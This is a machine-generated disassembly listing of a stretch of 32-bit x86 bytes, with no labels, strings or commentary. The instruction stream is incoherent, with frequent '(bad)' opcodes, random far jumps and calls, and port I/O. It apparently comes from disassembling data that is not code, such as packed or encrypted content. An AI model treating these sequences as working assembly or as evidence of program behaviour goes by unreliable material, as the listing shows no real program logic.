  427b90:	pop    esi
  427b91:	pusha  
  427b92:	mov    al,0xfa
  427b94:	or     eax,0xa4f55948
  427b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b9a:	jge    0x427b39
  427b9c:	fcomi  st,st(0)
  427b9e:	cmp    al,ch
  427ba0:	pop    ecx
  427ba1:	dec    esp
  427ba2:	(bad)  
  427ba3:	rol    DWORD PTR [edx-0x245abe19],cl
  427ba9:	xor    bh,bh
  427bab:	test   BYTE PTR [ebx],bh
  427bad:	jo     0x427be5
  427baf:	mov    ds:0xd3f148e,eax
  427bb4:	(bad)  
  427bb5:	sub    eax,0xa8cebb96
  427bba:	loopne 0x427b46
  427bbc:	in     eax,0xd1
  427bbe:	inc    esp
  427bbf:	fidiv  WORD PTR [ecx]
  427bc1:	fabs   
  427bc3:	xor    DWORD PTR [ebx],edi
  427bc5:	mov    fs,WORD PTR [ecx]
  427bc7:	daa    
  427bc8:	mov    edx,0xf7467e97
  427bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bce:	fsubr  QWORD PTR [eax+0x59]
  427bd1:	push   esp
  427bd2:	jnp    0x427bbe
  427bd4:	and    al,BYTE PTR [ecx]
  427bd6:	icebp  
  427bd7:	jb     0x427c17
  427bd9:	push   ds
  427bda:	dec    edx
  427bdb:	call   0x68e7:0x91031673
  427be2:	arpl   WORD PTR [esi-0x6b],ax
  427be5:	js     0x427b94
  427be7:	xchg   al,al
  427be9:	mov    edi,0x679063be
  427bee:	mov    dl,0xa3
  427bf0:	jl     0x427c22
  427bf2:	je     0x427c5a
  427bf4:	cld    
  427bf5:	out    0xa,eax
  427bf7:	xor    eax,0x86b91c21
  427bfc:	add    al,0xd7
  427bfe:	jg     0x427bd5
  427c00:	fnstenv [ebp-0x536397cd]
  427c06:	es aad 0x3e
  427c09:	xor    al,BYTE PTR [ecx]
  427c0b:	mov    WORD PTR [ecx],?
  427c0d:	push   esi
  427c0e:	pop    eax
  427c0f:	loopne 0x427c55
  427c11:	fist   WORD PTR [esi+0x41b85be]
  427c17:	adc    eax,0xe8a81ff6
  427c1c:	adc    BYTE PTR [esi+0x65],bl
  427c1f:	mov    al,BYTE PTR [edi-0x68]
  427c22:	inc    ebx
  427c23:	dec    eax
  427c24:	mov    edx,0x587fb6a8
  427c29:	and    eax,0x8d8a6fe8
  427c2e:	out    0x6d,al
  427c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c31:	or     eax,0xe8bd4e
	...
  427c96:	mov    ds:0xf343b050,eax
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0x23682185
  427ca5:	fdivr  QWORD PTR [ecx+0x70001a8]
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    BYTE PTR [eax+0x32],bl
  427cb0:	jns    0x427d1f
  427cb2:	stc    
  427cb3:	and    al,0xc0
  427cb5:	dec    esp
  427cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427cb7:	jecxz  0x427d08
  427cb9:	lea    ecx,ds:[ebp-0xc424732]
  427cc0:	adc    BYTE PTR [ecx-0x75145acc],dl
  427cc6:	mov    al,0xe2
  427cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cc9:	mov    bh,0x7b
  427ccb:	pusha  
  427ccc:	push   es
  427ccd:	add    eax,0x2d866487
  427cd2:	std    
  427cd3:	fisub  DWORD PTR [ebx]
  427cd5:	sub    dl,bl
  427cd7:	sbb    ah,BYTE PTR [ecx+ebp*1-0x20]
  427cdb:	fsub   QWORD PTR [ebx-0x69]
  427cde:	fcom   QWORD PTR [edx]
  427ce0:	fwait
  427ce1:	jmp    0x427c75
  427ce3:	out    dx,al
  427ce4:	add    DWORD PTR [esp+esi*8-0x56a28955],0x763dd901
  427cef:	xor    eax,DWORD PTR [eax+0x45d0183d]
  427cf5:	inc    esi
  427cf6:	ret    
  427cf7:	xchg   ebx,eax
  427cf8:	xor    dh,BYTE PTR [ecx+0x7763c765]
  427cfe:	inc    esi
  427cff:	dec    DWORD PTR [ecx-0x68]
  427d02:	mov    ah,0x22
  427d04:	mov    ds:0x8d740c8e,al
  427d09:	pop    ss
  427d0a:	xchg   edi,eax
  427d0b:	jle    0x427d41
  427d0d:	mov    edi,0x27a6124c
  427d12:	inc    edi
  427d13:	in     eax,dx
  427d14:	cmp    BYTE PTR [esi+esi*4],bh
  427d17:	xchg   esi,eax
  427d18:	(bad)  
  427d19:	sahf   
  427d1a:	mov    esp,0x7744d263
  427d1f:	xor    BYTE PTR [eax+0x16835e44],ch
  427d25:	add    edi,DWORD PTR [eax+0x3ad63f28]
  427d2b:	xchg   BYTE PTR [esi+0x6a],ah
  427d2e:	cld    
  427d2f:	jmp    0x5a42:0x435ef2fe
  427d36:	and    dl,bl
  427d38:	and    BYTE PTR [edi+eiz*4],ah
  427d3b:	fs xor al,0x9c
  427d3e:	enter  0x18a2,0x69
  427d42:	mul    esp
  427d44:	mov    BYTE PTR [ebx+0x10cb5dce],cl
  427d4a:	or     esp,DWORD PTR [esi]
  427d4c:	jmp    0x217a2f71
  427d51:	sbb    BYTE PTR [ecx+eax*2-0x6e4d3b40],bl
  427d58:	aas    
  427d59:	pop    ds
  427d5a:	inc    esp
  427d5b:	adc    al,BYTE PTR [edi]
  427d5d:	mov    ebx,0xcb3b785e
  427d62:	sbb    eax,DWORD PTR [ecx]
  427d64:	dec    ecx
  427d65:	jecxz  0x427d7b
  427d67:	xor    BYTE PTR [ebx-0xe4c0c1b],ch
  427d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d6e:	inc    eax
  427d6f:	xchg   BYTE PTR [edx-0x20],dh
  427d72:	add    bl,BYTE PTR [ecx-0x38]
  427d75:	sbb    BYTE PTR [ebx],al
  427d77:	call   0x3adc:0x53df3c5f
  427d7e:	aam    0xa4
  427d80:	cli    
  427d81:	xchg   ebx,eax
  427d82:	jle    0x427d07
  427d84:	test   edx,eax
  427d86:	pop    ds
  427d87:	adc    eax,0x3da4929a
  427d8c:	aaa    
  427d8d:	(bad)  
  427d8e:	call   0xd91d86db
  427d93:	pop    esi
  427d94:	or     ecx,DWORD PTR [ebx-0x46]
  427d97:	shl    DWORD PTR [esi-0x785a7e6d],1
  427d9d:	pop    esi
  427d9e:	or     BYTE PTR [edi],cl
  427da0:	frstor [ebp+esi*8-0x60]
  427da4:	cdq    
  427da5:	cmp    DWORD PTR [edx],ebp
  427da7:	push   ss
  427da8:	add    eax,DWORD PTR [ebp+0x1]
  427dab:	sti    
  427dac:	dec    edx
  427dad:	bound  eax,QWORD PTR [esi]
  427daf:	sub    ah,ah
  427db1:	ror    DWORD PTR [edx-0x71],0x4
	...
  427e15:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    ch,cl
  427e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e24:	into   
  427e25:	int    0xc0
  427e27:	test   eax,0x1070001
  427e2c:	add    BYTE PTR [eax],al
  427e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e2f:	push   ebx
  427e30:	dec    ebx
  427e31:	xchg   ebp,eax
  427e32:	mov    dl,0xd7
  427e34:	xor    BYTE PTR [edi+0x28470654],ah
  427e3a:	es pop esp
  427e3c:	rol    BYTE PTR [ebx],cl
  427e3e:	pop    edx
  427e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e40:	mov    ds:0xd3072124,al
  427e45:	data16 ds mov dl,0x69
  427e49:	lea    esi,[ebx+ebx*4+0x3]
  427e4d:	jns    0x427e04
  427e4f:	mov    ecx,ecx
  427e51:	jo     0x427de2
  427e53:	loopne 0x427e43
  427e55:	and    DWORD PTR [ecx-0x24b73de3],eax
  427e5b:	sar    DWORD PTR [ebp+0x4bb27b95],1
  427e61:	aaa    
  427e62:	jle    0x427e20
  427e64:	(bad)  
  427e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e67:	push   ecx
  427e68:	mov    ah,0xd2
  427e6a:	nop
  427e6b:	les    eax,FWORD PTR [esi]
  427e6d:	mov    dh,0xf0
  427e6f:	add    al,0x9c
  427e71:	daa    
  427e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e73:	dec    ecx
  427e74:	adc    edi,esi
  427e76:	push   esi
  427e77:	sbb    dh,dh
  427e79:	hlt    
  427e7a:	mov    al,ds:0x10541067
  427e7f:	loop   0x427ec9
  427e81:	js     0x427e94
  427e83:	push   cs
  427e84:	dec    ebp
  427e85:	jle    0x427e60
  427e87:	inc    esi
  427e88:	daa    
  427e89:	jmp    0xc33fbd40
  427e8e:	ret    0x5ded
  427e91:	leave  
  427e92:	ja     0x427ea9
  427e94:	lods   eax,DWORD PTR ds:[esi]
  427e95:	cmc    
  427e96:	xor    eax,0x49b1f35b
  427e9b:	sub    cl,BYTE PTR [ebx-0x40]
  427e9e:	push   cs
  427e9f:	mov    bl,0x6d
  427ea1:	rcl    BYTE PTR [ebp+eax*8+0x2addd87a],cl
  427ea8:	xchg   DWORD PTR [ebx-0x5acea2bb],esi
  427eae:	shr    BYTE PTR ds:0x2be281fc,cl
  427eb4:	sub    ah,BYTE PTR [eax]
  427eb6:	push   eax
  427eb7:	imul   eax,DWORD PTR [ecx],0x24
  427eba:	mov    eax,0x387dd383
  427ebf:	nop
  427ec0:	in     al,dx
  427ec1:	adc    ebx,DWORD PTR [ebp-0x7]
  427ec4:	sub    cl,dh
  427ec6:	jg     0x427e87
  427ec8:	sub    cl,BYTE PTR [edi-0x38]
  427ecb:	outs   dx,BYTE PTR ds:[esi]
  427ecc:	(bad)  
  427ecd:	mov    esi,0x367b1616
  427ed2:	sbb    eax,0xc25d812
  427ed7:	rcl    DWORD PTR [ebx-0x1ad81e0c],0xe7
  427ede:	hlt    
  427edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ee0:	xor    BYTE PTR [edi-0x225b9b],al
  427ee6:	test   cl,al
  427ee8:	add    ebx,ebp
  427eea:	push   edx
  427eeb:	adc    eax,0x6e3d7d8b
  427ef0:	adc    esp,DWORD PTR [esi+0x5d]
  427ef3:	lods   eax,DWORD PTR ds:[esi]
  427ef4:	inc    edi
  427ef5:	inc    edi
  427ef6:	cmp    DWORD PTR [ebx-0x33a1fa41],edi
  427efc:	shl    BYTE PTR [ecx+0x42],0x12
  427f00:	mov    bp,0x3f16
  427f04:	xchg   esi,eax
  427f05:	lock lods eax,DWORD PTR ds:[esi]
  427f07:	xor    al,0xd1
  427f09:	pop    ds
  427f0a:	cli    
  427f0b:	or     DWORD PTR [edi+0x76038fe],edi
  427f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f12:	stc    
  427f13:	push   es
  427f14:	dec    edi
  427f15:	shl    DWORD PTR [ecx-0x3e],0x7e
  427f19:	fistp  DWORD PTR [eax+0x73192754]
  427f1f:	loopne 0x427f42
  427f21:	xchg   edi,eax
  427f22:	xor    ebx,DWORD PTR [edi+0x453b4b3e]
  427f28:	cmp    eax,0x8de8c7fb
  427f2d:	and    eax,0x55aa08e0
  427f32:	(bad)  
  427f33:	xor    DWORD PTR [edi],edx
	...
  427f95:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	xor    al,0xd4
  427fa4:	adc    cl,ch
  427fa6:	(bad)  
  427fa7:	stos   BYTE PTR es:[edi],al
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    BYTE PTR [esi],dl
  427faf:	and    BYTE PTR [eax+0x74868ca9],bh
  427fb5:	xor    eax,0x42350b74
  427fba:	pop    esi
  427fbb:	aam    0xb7
  427fbd:	not    BYTE PTR [edi+0x5]
  427fc0:	dec    ebx
  427fc1:	iret   
  427fc2:	sub    BYTE PTR [ecx+0x5f],dl
  427fc5:	int3   
  427fc6:	je     0x427f79
  427fc8:	mov    edi,0xcbb0790b
  427fcd:	or     ebp,edi
  427fcf:	fist   DWORD PTR [ecx+0x72]
  427fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fd3:	xor    BYTE PTR [ecx],ch
  427fd5:	and    ah,bl
  427fd7:	cmp    eax,0x657530e7
  427fdc:	sbb    DWORD PTR [edx-0x39],esp
  427fdf:	push   eax
  427fe0:	add    BYTE PTR [ebx-0x3c],bl
  427fe3:	fist   DWORD PTR [edx]
  427fe5:	fld    DWORD PTR [edi+0x7d9242f]
  427feb:	lss    esp,FWORD PTR [ecx-0x44]
  427fef:	jbe    0x427fdd
  427ff1:	mov    ebx,0xd10796d9
  427ff6:	aaa    
  427ff7:	popf   
  427ff8:	ds pop ecx
  427ffa:	xchg   ecx,eax
  427ffb:	xlat   BYTE PTR ds:[ebx]
  427ffc:	int3   
  427ffd:	or     edx,ebx
  427fff:	push   ecx
  428000:	and    BYTE PTR [edi+edx*8],0x9a
  428004:	call   0x4677:0xbd3a10e0
  42800b:	xchg   dl,ch
  42800d:	adc    esi,edi
  42800f:	or     ah,BYTE PTR [eax+edi*8-0x7f13930d]
  428016:	mov    ecx,0xe00550cc
  42801b:	(bad)  
  42801c:	jmp    FWORD PTR [ebp+eax*4-0x402870e6]
  428023:	lock xrelease or DWORD PTR [ecx],esp
  428027:	jmp    0x98ba:0x125eae5
  42802e:	pop    es
  42802f:	add    cl,al
  428031:	sar    DWORD PTR [edi+ebx*1],cl
  428034:	lods   al,BYTE PTR ds:[esi]
  428035:	ret    
  428036:	ret    0x58b2
  428039:	int    0x3c
  42803b:	iret   
  42803c:	and    al,bl
  42803e:	adc    ecx,edx
  428040:	adc    DWORD PTR [ecx+ecx*2],0x9d1e63e0
  428047:	xor    al,0xa2
  428049:	mov    al,0xa1
  42804b:	rol    ecx,cl
  42804d:	jae    0x428056
  42804f:	adc    DWORD PTR [eax+0x61],0x68
  428053:	add    BYTE PTR [eax-0x4c98b5f9],al
  428059:	mov    BYTE PTR [edx+0x3944e15c],bl
  42805f:	ds (bad) cs:[ebx-0x62]
  428064:	xor    eax,0x6012545b
  428069:	stos   DWORD PTR es:[edi],eax
  42806a:	nop
  42806b:	ror    DWORD PTR [eax+0x34dd0590],cl
  428071:	adc    ah,bh
  428073:	fcomp  QWORD PTR [esi+0x73349142]
  428079:	sub    DWORD PTR [ebx-0x59],edi
  42807c:	push   esp
  42807d:	and    cl,BYTE PTR [ecx+esi*4]
  428080:	jne    0x42805e
  428082:	loopne 0x4280bb
  428084:	dec    ecx
  428085:	dec    esp
  428086:	neg    DWORD PTR [esi]
  428088:	xor    edx,DWORD PTR [ebp-0x70]
  42808b:	rcr    BYTE PTR [ebx],cl
  42808d:	dec    eax
  42808e:	test   DWORD PTR [ebx-0x5c],ebp
  428091:	mov    ebx,0xd81c81e3
  428096:	adc    esi,DWORD PTR [esp+ebp*4+0x1548a89e]
  42809d:	push   ecx
  42809e:	pop    esi
  42809f:	adc    DWORD PTR [eax+0x1b],esp
  4280a2:	fs mov esp,0x33593dab
  4280a8:	arpl   WORD PTR [ebp-0x59],cx
  4280ab:	jge    0x4280f4
  4280ad:	adc    BYTE PTR [ecx+0x753ed08a],0x6a
  4280b4:	cmp    eax,0x0
	...
  428115:	add    bh,bl
  428117:	out    dx,al
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	mov    esi,0xcef2a549
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    BYTE PTR [edi+0x2ab68c64],cl
  428133:	mov    ebx,0xd4cd4957
  428138:	out    0x69,eax
  42813a:	sub    bl,BYTE PTR [ebx-0x27]
  42813d:	cli    
  42813e:	imul   ebp,DWORD PTR [esi+ecx*4-0x73],0x7f
  428143:	fnstcw WORD PTR [ebx+edi*4-0x3353e491]
  42814a:	jge    0x4281bb
  42814c:	cmp    DWORD PTR fs:[ecx],edi
  42814f:	popa   
  428150:	clc    
  428151:	into   
  428152:	or     al,0x60
  428154:	mov    ebp,0x809db43b
  428159:	jmp    0xe07f4fae
  42815e:	int    0x26
  428160:	jne    0x428195
  428162:	imul   eax,DWORD PTR [ebx+ecx*4-0x62],0xffffffeb
  428167:	dec    edx
  428168:	scas   al,BYTE PTR es:[edi]
  428169:	dec    ebp
  42816a:	aad    0x6a
  42816c:	push   edi
  42816d:	(bad)  
  42816f:	cmp    DWORD PTR [eax-0xf6d1973],ecx
  428175:	stos   BYTE PTR es:[edi],al
  428176:	sbb    ebp,ecx
  428178:	xlat   BYTE PTR ds:[ebx]
  428179:	and    BYTE PTR [ebx],bl
  42817b:	dec    ebx
  42817c:	fist   WORD PTR [edx+edx*8-0x31]
  428180:	cmp    bh,cl
  428182:	ret    
  428183:	ret    
  428184:	ins    DWORD PTR es:[edi],dx
  428185:	cs jo  0x428131
  428188:	imul   ebx,ebx,0xffffff96
  42818b:	clc    
  42818c:	outs   dx,DWORD PTR ds:[esi]
  42818d:	call   0x4355185c
  428192:	loop   0x428194
  428194:	xlat   BYTE PTR ds:[ebx]
  428195:	rcr    BYTE PTR [edi+0x59],1
  428198:	dec    edi
  428199:	fcmove st,st(7)
  42819b:	sbb    BYTE PTR [ecx-0x14],ah
  42819e:	sahf   
  42819f:	jecxz  0x428151
  4281a1:	pop    es
  4281a2:	cmp    BYTE PTR [esi+0x413446e1],ah
  4281a8:	pop    ds
  4281a9:	pop    eax
  4281aa:	cwde   
  4281ab:	call   0xe607c3f7
  4281b0:	ins    DWORD PTR es:[edi],dx
  4281b1:	dec    edx
  4281b2:	(bad)  
  4281b3:	call   0x83e1ec85
  4281b8:	pop    esi
  4281b9:	jae    0x42820f
  4281bb:	mov    ebp,0x5d8aef84
  4281c0:	aad    0x91
  4281c2:	bnd jl 0x428242
  4281c5:	push   esp
  4281c6:	pusha  
  4281c7:	aaa    
  4281c8:	enter  0xb27d,0x1f
  4281cc:	shl    BYTE PTR [ebp+0xa8f8520],0xcd
  4281d3:	(bad)  
  4281d4:	loop   0x42823f
  4281d6:	xor    edx,DWORD PTR [ebp-0x63f7e645]
  4281dc:	lods   al,BYTE PTR ds:[esi]
  4281dd:	cld    
  4281de:	outs   dx,BYTE PTR ds:[esi]
  4281df:	popa   
  4281e0:	and    eax,edi
  4281e2:	add    BYTE PTR [ebp-0x2d8543b8],0x1
  4281e9:	pop    ebx
  4281ea:	popa   
  4281eb:	repz push eax
  4281ed:	and    BYTE PTR [ebx+esi*1+0x66294de0],ch
  4281f4:	push   esp
  4281f5:	pop    esi
  4281f6:	fdiv   DWORD PTR [edi-0x7a]
  4281f9:	xor    DWORD PTR [edx+0x3f4f9a6b],esp
  4281ff:	or     BYTE PTR [esi-0x78f76ea],cl
  428205:	inc    ebp
  428206:	cmp    al,0xf6
  428208:	jp     0x4281f8
  42820a:	pop    gs
  42820c:	xor    BYTE PTR [ecx],bh
  42820e:	cmp    esp,DWORD PTR cs:[esi-0xb4b97e3]
  428215:	je     0x42827b
  428217:	mov    edi,0x1f1445ee
  42821c:	mov    DWORD PTR [eax-0xc],ecx
  42821f:	add    ecx,DWORD PTR [edi]
  428221:	add    al,0x7e
  428223:	xchg   esp,eax
  428224:	pop    ebx
  428225:	(bad)  
  428226:	out    0xf8,eax
  428228:	fnsave [esi-0x4d24dfa8]
  42822e:	inc    cx
  428230:	stc    
  428231:	and    ebx,esi
  428233:	mov    edi,0xd3
	...
  428294:	add    BYTE PTR [eax],al
  428296:	(bad)  
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	hlt    
  4282a3:	sub    edx,eax
  4282a5:	lock aad 0xac
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [ebx+0x227264da],ah
  4282b3:	add    BYTE PTR [ecx-0x4c9a394f],bh
  4282b9:	lods   al,BYTE PTR ds:[esi]
  4282ba:	xchg   DWORD PTR [esi],ebx
  4282bc:	out    dx,eax
  4282bd:	out    0xea,eax
  4282bf:	push   eax
  4282c0:	pop    ecx
  4282c1:	aaa    
  4282c2:	nop
  4282c3:	cld    
  4282c4:	jmp    0x4282cc
  4282c6:	cmc    
  4282c7:	cmp    esp,DWORD PTR [ecx+0x67]
  4282ca:	cmp    eax,0x36db22b3
  4282cf:	jnp    0x42830a
  4282d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282d2:	jae    0x428313
  4282d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282d5:	repnz shr esp,cl
  4282d8:	mov    dl,0xaa
  4282da:	clc    
  4282db:	and    cl,0x74
  4282de:	push   0x5d
  4282e0:	nop
  4282e1:	(bad)  
  4282e2:	adc    cl,bl
  4282e4:	je     0x428355
  4282e6:	xor    eax,0x383227d8
  4282eb:	dec    ebp
  4282ec:	sbb    ecx,DWORD PTR [eax+0x65]
  4282ef:	lea    esp,[ebx+0x591db9a]
  4282f5:	push   eax
  4282f6:	sub    edx,esp
  4282f8:	out    dx,eax
  4282f9:	and    bh,BYTE PTR [ebx+eiz*2-0x77]
  4282fd:	jbe    0x4282cd
  4282ff:	ins    BYTE PTR es:[edi],dx
  428300:	ud1    edx,ebx
  428303:	mov    WORD PTR [ecx-0x4347fe1d],?
  428309:	mov    esp,0xd2217ae8
  42830e:	cwde   
  42830f:	test   DWORD PTR [edi+0x3f],esi
  428312:	int3   
  428313:	fcmove st,st(3)
  428315:	jge    0x42832b
  428317:	adc    ah,BYTE PTR [ebp-0x7f]
  42831a:	popf   
  42831b:	daa    
  42831c:	stc    
  42831d:	jae    0x4282b4
  42831f:	dec    ebx
  428320:	jae    0x428341
  428322:	mov    eax,ds:0xef0c48df
  428327:	clc    
  428328:	out    dx,eax
  428329:	jo     0x4282d5
  42832b:	sbb    DWORD PTR [edi],0xffffffa7
  42832e:	in     al,dx
  42832f:	dec    ebp
  428330:	jp     0x4282be
  428332:	pop    ds
  428333:	pop    es
  428334:	sahf   
  428335:	bound  edi,QWORD PTR [edx+0x7edc60dc]
  42833b:	dec    edx
  42833c:	das    
  42833d:	sbb    DWORD PTR [esi],edi
  42833f:	xor    al,BYTE PTR [ebp-0x40]
  428342:	popf   
  428343:	(bad)  
  428345:	sbb    ch,al
  428347:	aam    0x14
  428349:	es pop edx
  42834b:	mov    ds,ebp
  42834d:	inc    ebp
  42834e:	mov    dl,0xa5
  428350:	outs   dx,BYTE PTR ds:[esi]
  428351:	xor    esp,0x5cb8dfe9
  428357:	lahf   
  428358:	pushf  
  428359:	cmp    esi,esp
  42835b:	sbb    esi,ebp
  42835d:	add    ebp,DWORD PTR [eax+0x76078ede]
  428363:	mov    ecx,0xa0cdce63
  428368:	adc    cl,BYTE PTR [edx]
  42836a:	into   
  42836b:	xor    dl,BYTE PTR [edi-0x7c1e48d0]
  428371:	sti    
  428372:	test   ch,ch
  428374:	and    esp,DWORD PTR [ebx+0x7082e5df]
  42837a:	aas    
  42837b:	in     al,dx
  42837c:	fld    TBYTE PTR [ebx+0x3b]
  42837f:	xor    al,0x22
  428381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428382:	test   DWORD PTR [ecx],ecx
  428384:	fisubr WORD PTR [eax+edx*4-0x6ae8a5fc]
  42838b:	(bad)  
  42838c:	jae    0x4283bf
  42838e:	mov    bl,0x95
  428390:	fdiv   st,st(2)
  428392:	adc    eax,0x98621b86
  428397:	les    esp,FWORD PTR [edi]
  428399:	jg     0x4283ca
  42839b:	xchg   ecx,eax
  42839c:	mov    cl,0xca
  42839e:	rol    BYTE PTR [eax-0x5b56cf51],1
  4283a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283a5:	pusha  
  4283a6:	cmp    edx,esi
  4283a8:	mov    ch,al
  4283aa:	ins    BYTE PTR es:[edi],dx
  4283ab:	pop    esp
  4283ac:	mov    BYTE PTR [ebx+0x3cea9bb4],bh
  4283b2:	hlt    
  4283b3:	hlt    
  4283b4:	loopne 0x4283b6
	...
  428416:	push   cs
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	(bad)  
  428422:	clc    
  428423:	mov    ecx,0xaddcc618
  428428:	add    DWORD PTR [eax],eax
  42842a:	pop    es
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [eax],bh
  42842f:	mov    ebp,0xb5d9edc7
  428434:	dec    esp
  428435:	out    dx,eax
  428436:	call   0x1f1bdd82
  42843b:	movaps xmm6,XMMWORD PTR [eax+0x63]
  42843f:	jne    0x42846a
  428441:	addr16 out 0xb7,al
  428444:	jp     0x4284b8
  428446:	(bad)  
  428447:	(bad)  
  428448:	out    dx,al
  428449:	jmp    0x42843e
  42844b:	xlat   BYTE PTR ds:[ebx]
  42844c:	cmp    BYTE PTR ds:0xf55172e2,0xdd
  428453:	adc    eax,0x5899ea42
  428458:	mov    eax,0xa0a1ea21
  42845d:	or     DWORD PTR [edi],0x2657bbe5
  428463:	ins    BYTE PTR es:[edi],dx
  428464:	retf   0xbf46
  428467:	in     eax,0x2e
  428469:	sbb    al,0x95
  42846b:	add    BYTE PTR [edx-0x516c60c9],cl
  428471:	scas   al,BYTE PTR es:[edi]
  428472:	jo     0x4283f5
  428474:	ss lock dec ebp
  428477:	(bad)  
  428478:	scas   eax,DWORD PTR es:[edi]
  428479:	push   edx
  42847a:	adc    al,0xa9
  42847c:	stc    
  42847d:	mov    edx,0xc7d7a948
  428482:	dec    DWORD PTR [ebx+0x64]
  428485:	add    DWORD PTR [ecx+0x8],edx
  428488:	stos   DWORD PTR es:[edi],eax
  428489:	sub    eax,0xb7f7e7d6
  42848e:	cmp    eax,0xcaaf7fa4
  428493:	imul   esp,DWORD PTR [edx+0x2098fa35],0xc2369169
  42849d:	(bad)  
  42849e:	mov    eax,ds:0xce52e24d
  4284a3:	sbb    dh,BYTE PTR [edx]
  4284a5:	add    DWORD PTR [ebx-0x34],0x4b
  4284a9:	push   ecx
  4284aa:	lea    edx,[edx+0x2d]
  4284ad:	call   FWORD PTR [ecx+esi*4-0x6a]
  4284b1:	adc    esi,ebp
  4284b3:	test   BYTE PTR [ecx-0x67],bh
  4284b6:	rol    BYTE PTR [eax+0x3e],cl
  4284b9:	dec    edi
  4284ba:	fcmovu st,st(5)
  4284bc:	sbb    edi,esp
  4284be:	jge    0x4284d4
  4284c0:	ret    
  4284c1:	inc    esi
  4284c2:	jb     0x4284b9
  4284c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284c5:	adc    eax,0xd2b97f27
  4284ca:	stos   BYTE PTR es:[edi],al
  4284cb:	aas    
  4284cc:	inc    ebx
  4284cd:	mov    ah,0xa0
  4284cf:	call   0x75632017
  4284d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284d5:	popa   
  4284d6:	sbb    al,0x5f
  4284d8:	push   ebx
  4284d9:	cmp    edx,ebx
  4284db:	int3   
  4284dc:	push   esp
  4284dd:	dec    eax
  4284de:	dec    ebp
  4284df:	add    ah,0xc7
  4284e2:	cs dec eax
  4284e4:	icebp  
  4284e5:	xchg   edi,eax
  4284e6:	xchg   esi,eax
  4284e7:	jg     0x42852a
  4284e9:	cli    
  4284ea:	push   ds
  4284eb:	dec    ecx
  4284ec:	ror    BYTE PTR [ebx+0x4f4205bf],cl
  4284f2:	push   ds
  4284f3:	ins    DWORD PTR es:[edi],dx
  4284f4:	dec    ebx
  4284f5:	fs (bad) 
  4284f7:	cld    
  4284f8:	cmp    eax,0x66d5b1a2
  4284fd:	xor    DWORD PTR [eax-0x105a8761],edx
  428503:	cmp    al,0xd8
  428505:	mov    DWORD PTR [esi+eax*2+0x29f8e47c],ecx
  42850c:	mov    bl,0x11
  42850e:	lock repnz mov ds:0xa048d6a6,al
  428515:	arpl   WORD PTR [ecx-0x3833f6a6],bx
  42851b:	mov    cl,BYTE PTR [ebx+0x3c5da342]
  428521:	aam    0xa7
  428523:	das    
  428524:	or     BYTE PTR [edi+0x23],ah
  428527:	jg     0x42855d
  428529:	sti    
  42852a:	and    cl,BYTE PTR [edi]
  42852c:	push   0x2f
  42852e:	clc    
  42852f:	div    BYTE PTR [edi]
  428531:	repnz sbb BYTE PTR [esi+0x4],dh
	...
  428595:	add    BYTE PTR [ecx-0xa],dl
  428598:	xor    eax,0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	lea    ebx,[eax+edx*2]
  4285a5:	sahf   
  4285a6:	jecxz  0x428556
  4285a8:	add    DWORD PTR [eax],eax
  4285aa:	pop    es
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [eax],al
  4285af:	add    dl,BYTE PTR [ebp+0x629ab4ed]
  4285b5:	cmc    
  4285b6:	xor    al,0x18
  4285b8:	aas    
  4285b9:	push   ebp
  4285ba:	and    cx,WORD PTR [eax]
  4285bd:	jno    0x4285ed
  4285bf:	cmp    ah,BYTE PTR [ebp+0x375f922d]
  4285c5:	cdq    
  4285c6:	clc    
  4285c7:	push   0x4312dbb9
  4285cc:	push   ebx
  4285cd:	fidiv  DWORD PTR [ebp+0x21]
